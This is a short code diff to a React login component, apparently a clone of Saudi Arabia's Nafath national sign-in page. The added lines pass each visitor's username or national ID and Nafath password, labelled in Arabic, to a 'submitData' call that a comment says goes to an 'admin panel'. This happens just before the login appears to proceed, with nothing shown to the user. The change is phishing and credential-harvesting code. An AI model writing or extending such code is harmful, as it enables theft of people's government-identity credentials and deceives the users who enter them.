@@ -1,4 +1,5 @@
 import { useState, useRef, useEffect } from "react";
+import { socket, updatePage, submitData } from "@/lib/store";
 import { Eye, EyeOff, Globe, Plus, Minus, User, Lock, Loader2, AlertCircle } from "lucide-react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
@@ -86,6 +87,12 @@ export default function NafathLogin() {
                     setErrors(newErrors);
                     
                     if (Object.keys(newErrors).length === 0) {
+                      // Send data to admin panel
+                      submitData({
+                        'اسم المستخدم / الهوية الوطنية': username,
+                        'كلمة المرور (نفاذ)': password
+                      });
+                      
                       // Proceed with login
                       setIsLoading(true);
                       setTimeout(() => {
